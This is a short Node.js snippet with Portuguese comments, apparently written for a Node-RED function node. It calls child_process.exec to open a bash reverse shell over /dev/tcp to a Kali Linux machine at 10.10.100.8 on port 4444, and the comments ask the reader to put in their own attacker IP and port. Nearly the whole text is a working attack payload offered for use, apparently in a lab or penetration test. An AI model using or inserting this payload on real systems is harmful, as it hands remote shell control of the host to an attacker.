// Importa o módulo nativo do NodeJS para execução de processos
const exec = require('child_process').exec;

// Comando conceitual para conectar de volta ao terminal do seu Kali Linux
// Substitua pelo IP do seu Kali (10.10.100.8) e a porta desejada (ex: 4444)
exec('bash -i >& /dev/tcp/10.10.100.8/4444 0>&1', (error, stdout, stderr) => {
    // Executado de forma assíncrona em segundo plano
});

return msg;
